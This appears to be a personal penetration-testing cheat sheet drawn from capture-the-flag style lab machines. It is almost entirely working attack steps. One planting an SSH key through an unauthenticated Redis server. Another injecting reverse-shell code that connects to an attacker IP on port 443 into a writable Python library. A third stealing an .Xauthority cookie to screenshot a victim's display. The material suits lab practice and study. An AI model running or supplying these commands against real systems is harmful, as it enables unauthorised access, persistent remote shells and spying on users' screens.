RCE Through Redis:

redis-cli -h 10.10.10.160 

Commadns to run on Redis:
config get dir
config set dir ./.ssh

ssh-keygen
(echo -e "\n\n"; cat ~/id_rsa_generated.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set 0xdf
config set dbfilename "authorized_keys"
save

*********************************************************************************
Python command to get system shell:

 __import__('os').system('bash')

Python library Hijacking:

Go to the python directory:

/usr/lib/python2 or 3

run following command to check writable modules in that directory
find -type f -writable -ls

add below code on the end of the writable module to get reverse shell:

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()

*********************************************************************************

Exploit Xauthority:

If you found .XAuthority file follow the steps:

Below cmmand convert the .XAuthority file content to base64:
cat .Xauthority | base64

Copy the base64 decoded content on victim machine with following command:
alex@squashed:~$ echo "AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABA7eHzhauR9tgmxMFdEhmzq" | base64 -d > /tmp/.Xauthority

Export the .XAuthority file:
export XAUTHORITY=/tmp/.Xauthority

We need to know wich display he is using, we can run 'w' command to see hhat:

We can take the screenshot of winodw with followinng command that contain senstive information:
xwd -root -screen -silent -display :0 > /tmp/screen.xwd

With following command we can conver the screenshot to png:
convert screen.xwd screen.png



